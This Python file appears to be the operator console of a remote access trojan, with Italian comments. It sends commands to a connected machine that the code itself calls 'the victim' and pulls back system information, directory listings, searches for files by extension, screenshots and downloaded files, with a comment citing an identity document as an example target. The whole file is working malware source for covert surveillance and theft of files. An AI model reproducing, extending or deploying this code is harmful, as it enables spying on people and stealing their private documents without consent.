import os
import time
import subprocess
from generalServer import *
from connectionServer import *
def openZip(comando, clientConnection,fileLog):
    try:
        filerecv = clientConnection.recv(1024)
        try:
            fileIf = filerecv.decode(FORMAT)
        except:
            fileIf = ""

        if fileIf[0:7] != "[ERROR]":
            fileLog = fileLog + "\n"
            while (filerecv != b'[END]'):
                print(fileIf, end="")
                fileLog = fileLog + fileIf
                filerecv = clientConnection.recv(1024)
                fileIf = filerecv.decode(FORMAT)

            print("\n")
            fileLog = fileLog + "\n"
            return fileLog

        else:
            print(fileIf)
            fileLog = fileLog + "\n" +fileIf+"\n"
            return fileLog

    except:
        fileLog = fileLog + "\n" + "Command open gone wrong\n"
        print("Command open gone wrong\n")
        return fileLog

def filespath(clientConnection,fileLog):

    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
        sleep(0.2)
    print("Wait...")

    try:
        nomeFile = "FilesPath.txt"
        file = open(nomeFile, 'ab')
        newNBytes = ""
        try:
            filerecv = clientConnection.recv(1024)
            try:
                fileIf = filerecv.decode(FORMAT)
            except:
                fileIf = ""

            if fileIf[0:7] != "[ERROR]":

                scritti = 0
                while (filerecv != b'[END]'):
                    scritti = scritti + file.write(filerecv)
                    filerecv = clientConnection.recv(1024)

                file.close()

                if os.path.getsize(nomeFile) <= 0:
                    fileLog = fileLog + "\n" + f"File created but not written correctly!\n"
                    print(f"File created but not written correctly!\n")
                    for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green",
                                  ncols=50,
                                  bar_format="{desc}: {percentage:3.0f}% {bar}"):
                        sleep(0.2)

                else:
                    fileLog = fileLog + "\n" + f"File successfully created!\n"
                    print(f"File successfully created!\n")
                    time.sleep(2)

                try:
                    if platform.system() == 'Darwin':  # macOS
                        subprocess.call(('open', os.getcwd()+"/"+nomeFile))
                    elif platform.system() == 'Windows':  # Windows
                        os.startfile(os.getcwd()+"\\"+nomeFile)
                    else:  # linux variants
                        subprocess.call(('xdg-open', os.getcwd()+"/"+nomeFile))
                except:
                    pass

                return fileLog

            else:
                print(fileIf)
                fileLog = fileLog + "\n" + fileIf + "\n"
                return fileLog
        except:
            fileLog = fileLog + "\n" + "Command Filespath gone wrong\n"
            print("Command Filespath gone wrong\n")
            return fileLog
    except:
        #traceback.print_exc()
        fileLog = fileLog + "\n" + "Command Filespath gone wrong\n"
        print("Command Filespath gone wrong\n")
        return fileLog


def download(comando,clientConnection,fileLog):

    nomeFile='null'
    inizio_file='null'
    fine_file='null'
    counter_virgolette=0
    regex_match = regexcheck_download(comando)
    if regex_match != 'null' and regex_match != 'not matched':
        if regex_match == 'windowstip1'or regex_match == 'unixtip1':
            #tipologia 1: (simile a find) download "nomefile.estensione" path
            for element in range(0, len(comando)):
                if comando[element] == "\"":
                    counter_virgolette += 1
                    if counter_virgolette == 1:
                        inizio_file = element+1
                    elif counter_virgolette == 2:
                        fine_file = element
        elif regex_match == 'windowstip2' or regex_match == 'unixtip2':
            #tipologia 2: (il risultato di filespath) "Carta di identità cartacea titolare.pdf" nel percorso: /Users/erasmo/Desktop
            for element in range(0, len(comando)):
                if comando[element] == "\"":
                    counter_virgolette += 1
                    if counter_virgolette == 1:
                        inizio_file = element+1
                    elif counter_virgolette == 2:
                        fine_file = element
        try:
            if inizio_file != 'null' and fine_file != 'null':
                nomeFile=comando[inizio_file:fine_file]
                file = open(nomeFile, 'wb')
                lunghezzacmd = len(nomeFile)

                for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + f"Downloading \"{nomeFile}\"...", colour="green",
                              ncols=45 + lunghezzacmd, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                    time.sleep(0.2)

                filerecv = clientConnection.recv(1024)
                try:
                    fileIf = filerecv.decode(FORMAT)
                except:
                    fileIf = ""
                if fileIf[0:7] != "[ERROR]":
                    scritti = 0
                    while (filerecv != b'[END]'):
                        scritti = scritti + file.write(filerecv)
                        filerecv = clientConnection.recv(1024)

                    file.close()

                    if os.path.getsize(nomeFile) <= 0:
                        fileLog = fileLog + "\n" + "Download failed\n" + "\n"
                        print("Download failed\n")
                        os.remove(nomeFile)
                    elif scritti < os.path.getsize(nomeFile):
                        fileLog = fileLog + "\n" + "Download failed\n" + "\n"
                        print("Download failed\n")
                        os.remove(nomeFile)
                    else:
                        fileLog = fileLog + "\n" + f"File {nomeFile} successfully downloaded\n" + "\n"
                        print(f"File {nomeFile} successfully downloaded\n")
                    time.sleep(2)
                    return nomeFile, fileLog

                else:
                    print(fileIf)
                    fileLog = fileLog + "\n" + fileIf + "\n"
                    return "[ERROR]", fileLog

            else:
                print("Couldn't take start and end point of the file's name")
                error = clientConnection.recv(256).decode(FORMAT)
                fileLog = fileLog + "\n" + "Couldn't take start and end point of the file's name" + "\n"
                print("Download failed\n")
                try:
                    os.remove(nomeFile)
                except:
                    pass
                fileLog = fileLog + "\n" + "Download failed\n"
                return "[ERROR]", fileLog
        except:
            print("Download failed\n")
            try:
                os.remove(nomeFile)
            except:
                pass
            fileLog = fileLog + "\n" + "Download failed\n"
            return "[ERROR]", fileLog

    else:
        print("The input doesn't match the regular expression for download command")
        fileLog = fileLog + "\n" +"The input doesn't match the regular expression for download command\n"
        return "[ERROR]", fileLog


# CONTROLLO REMOTO
def remoteControl(clientConnection,buff,fileLog):

    while True:
        try:
            pathError = ""
            if buff[0:6] == "[PATH]":
                pathError = buff
                buff = ""
            else:
                pathError = clientConnection.recv(1024).decode(FORMAT)

            if pathError[0:7] == "[ERROR]":
                path = clientConnection.recv(1024).decode(FORMAT)
                print(path + "$ " + pathError)
            else:
                while pathError[0:6] != "[PATH]":
                    pathError = pathError[1:]

                path = pathError[6:]

            comando = input(path + "$ ")
            while comando == "":
                comando = input(path + "$ ")

            fileLog = fileLog + "\n" + path + "$ " + comando + "\n"

            clientConnection.send((comando).encode(FORMAT))

            if comando == "exit":
                print(f"[REMOTE CONTROL CLOSED] Remote Control procedure successfully closed!\n")
                fileLog = fileLog + "\n" + f"[REMOTE CONTROL CLOSED] Remote Control procedure successfully closed!\n" + "\n"
                return "[END]", fileLog

            elif comando[0:2] == "ls":
                match= regexcheck_ls(comando)

                if match:
                    try:
                        dato = clientConnection.recv(8000).decode(FORMAT)
                        if dato[0:7]=="[ERROR]":
                            raise Exception
                        else:
                            print(dato)
                            fileLog = fileLog + "\n" + dato + "\n"
                    except:
                        #traceback.print_exc()
                        print("\nAn error occurred, try again\n")
                        fileLog = fileLog + "\n" + "An error occurred, try again...\n"

                else:
                    print("\nError, incorrect command")
                    fileLog = fileLog + "\n" + "Error, incorrect command\n"

            elif comando == "pwd":
                pwdresult = clientConnection.recv(1024).decode(FORMAT)
                print("\"" + pwdresult + "\"")
                fileLog = fileLog + "\n" + pwdresult + "\n"

            # "Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>"
            elif comando[0:9] == "filespath":
                #reg = "^filespath .[a-z]{1,4}|^filespath (\*)"
                reg = "^filespath( \.[a-z]{1,4})+"
                if (re.match(reg, comando)):
                    fileLog=filespath(clientConnection,fileLog)
                else:
                    print("Regular Expression not matched!")
                    fileLog = fileLog + "\n" + "Regular Expression not matched!\n"


            elif comando[0:4] == "find":

                if regexcheck_find(comando) == True:

                    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green", ncols=50,bar_format="{desc}: {percentage:3.0f}% {bar}"):
                        sleep(0.2)
                    print("Wait...")
                    filesize = clientConnection.recv(1024).decode(FORMAT)

                    if filesize[0:26]!="[ERROR] Path doesn't exist":
                        dato = ('').encode(FORMAT)
                        try:
                            dato = dato + clientConnection.recv(int(filesize))
                            print(dato.decode(FORMAT))
                            fileLog = fileLog + "\n" + dato.decode(FORMAT) + "\n"
                            for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Completing Operation", colour="green",
                                          ncols=50,
                                          bar_format="{desc}: {percentage:3.0f}% {bar}"):
                                sleep(0.2)
                        except:
                            #traceback.print_exc()
                            fileLog = fileLog + "\n" + "Command Find gone wrong\n"
                            print("Command Find gone wrong\n")
                    else:
                        print(filesize)
                else:
                    print("Regular Expression not matched!")
                    fileLog = fileLog + "\n" + "Regular Expression not matched!\n"

            elif comando == "clear":
                clearScreen()

            elif comando == "help":
                commandsHelp()

            elif comando[0:2] == "cd":
                pass

            elif comando == "info":
                output = clientConnection.recv(1024).decode(FORMAT)
                print(output)
                fileLog = fileLog + "\n" + output + "\n"


            elif comando[0:8] == "download":
                nomeFile,fileLog= download(comando,clientConnection,fileLog)
                try:
                    if nomeFile=="[ERROR]":
                        pass
                    else:
                        if platform.system() == 'Darwin':  # macOS
                            subprocess.call(('open', os.getcwd()+"/"+nomeFile))
                        elif platform.system() == 'Windows':  # Windows
                            os.startfile(os.getcwd()+"\\"+nomeFile)
                        else:  # linux variants
                            subprocess.call(('xdg-open', os.getcwd()+"/"+nomeFile))
                except:
                    pass

            elif comando[0:4] == "rete" or comando[0:7]=="network":
                try:
                    dato = clientConnection.recv(10000).decode()
                    if dato[0:7] == "[ERROR]":
                        raise Exception
                    else:
                        print(dato)
                        fileLog = fileLog + "\n" + dato +"\n"
                except:
                    #traceback.print_exc()
                    print("\nAn error occurred, try again\n")
                    fileLog = fileLog + "\n" + "An error occurred, try again...\n"

            elif comando == "screenshot":
                nomeFoto = input("Name of the screen (without extension): ")
                nomeFoto=nomeFoto+".png"
                fileLog = fileLog + "\n" + "Name of the screen (without extension): " + nomeFoto + "\n"

                try:
                    file = open(nomeFoto, 'wb')
                    lunghezzacmd = len(nomeFoto)

                    for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + f"Downloading \"{nomeFoto}\"...", colour="green",
                                  ncols=45 + lunghezzacmd, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                        time.sleep(0.2)

                    filerecv=clientConnection.recv(1024)
                    try:
                        fileIf=filerecv.decode(FORMAT)
                    except:
                        fileIf=""

                    if fileIf[0:7] != "[ERROR]":
                        scritti=0
                        while (filerecv != b'[END]'):
                            scritti = scritti + file.write(filerecv)
                            filerecv = clientConnection.recv(1024)

                        file.close()

                        if os.path.getsize(nomeFoto) <= 0:
                            fileLog = fileLog + "\n" + "Screenshot failed\n" + "\n"
                            print("Screenshot failed\n")
                            os.remove(nomeFoto)
                        elif scritti < os.path.getsize(nomeFoto):
                            fileLog = fileLog + "\n" + "Screenshot failed\n" + "\n"
                            print("Screenshot failed\n")
                            os.remove(nomeFoto)
                        else:
                            fileLog = fileLog + "\n" + f"Screenshot successfully downloaded\n" + "\n"
                            print(f"Screenshot successfully downloaded\n")
                        time.sleep(2)
                    else:
                        fileLog = fileLog + "\n" + "Screenshot failed\n" + "\n"
                        print("Screenshot failed\n")
                        os.remove(nomeFoto)

                except:
                    #traceback.print_exc()
                    fileLog = fileLog + "\n" + "Screenshot failed\n" + "\n"
                    print("Screenshot failed\n")
                    try:
                        os.remove(nomeFoto)
                    except:
                        pass

            elif comando[0:4] == "open":
                regex = r'^open \"[a-zA-Z0-9, ,\_,\-,\.,\']+\.zip\"'
                if re.match(regex, comando):
                    fileLog=openZip(comando, clientConnection,fileLog)
                else:
                    print("Regular Expression not matched!")
                    fileLog = fileLog + "\n" + "Regular Expression not matched!\n"


            else:
               print("[ERROR] Command not found... \n")
               fileLog = fileLog + "\n" + "[ERROR] Command not found... \n"

        except Exception as e:
            #traceback.print_exc()
            if e.__class__.__name__ == "ConnectionResetError":
                print(f"[ERROR] Connection Interrupted\n")
                fileLog = fileLog + "\n" + "[ERROR] Connection Interrupted\n" + "\n"
                return "[ERROR CONNECTION]", fileLog
            else:
                return "[ERROR]", fileLog


# OK STAMPA INFO CLIENT
def printInformazioni(clientConnection, addr, fileLog):
    buff = 1
    risposta = "1"
    nbytes = 1
    newNBytes=""

    print(f"\nInformation on the victim's Operating System {addr}:")
    fileLog = fileLog + "\n" + f"\nInformation on the victim's Operating System {addr}:" + "\n"
    try:
        while buff and nbytes != '':
            nbytes = clientConnection.recv(256).decode(FORMAT)
            if nbytes[0:1].isdigit():
                while nbytes[0:1].isdigit():
                    newNBytes = newNBytes + nbytes[0:1]
                    nbytes = nbytes[1:]

            buff = clientConnection.recv((int(newNBytes))).decode(FORMAT)
            print("\n"+ buff)
            fileLog=fileLog+"\n"+buff+"\n"

            print(f"\n[DONE] Info received.\n")
            fileLog = fileLog + "\n" + f"\n[DONE] Info received.\n" + "\n"

            if buff[0:6]=="[PATH]":
                return buff,fileLog
            else:
                return "",fileLog
    except:
        #traceback.print_exc()
        print(f"[ERROR] Information not received\n")
        fileLog = fileLog + "\n" + f"[ERROR] Information not received\n" + "\n"
        return fileLog

def commandsHelp():
    print(
        f"\n#####                                       Comandi disponibili                                                     ####")
    print()
    print(
        f"Download di file:                           download <\"nomeFile.estensione\"> <path> (txt docx pdf video foto excel cartelle zip ")
    print(f"Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione> ( .pdf, .dpcx, .txt, ecc...")
    print(f"Mostra Working Directory:                   pwd")
    print(f"Lista dei file in un percorso:              ls <Path>")
    print(f"Cambia la Working Directory:                cd <Path>")
    print(f"Cerca un tipo di estensione in un path:     find <.estensione> <Path>")
    print(f"Effettua screenshot:                        screenshot")
    print(f"Esci dal controllo remoto:                  exit")
    print(f"Ripulisci terminale:                        clear")
    print(f"Informazioni ifconfig/ipconfig:             rete/network")
    print(f"Informazioni S.O. client:                   info")
    print(f"Aprire un file.zip:                         open <\"nomeFile.zip\">")
    print()
    print("Tipologie di path:")
    print("\t'.'        indica il path corrente")
    print("\t'..'       indica il path fino alla cartella precedente")
    print("\t'./<path>' indica il path dalla cartella corrente fino al path inserito")
    print("\t'<path>'   indica il path")


    print("####################################\n")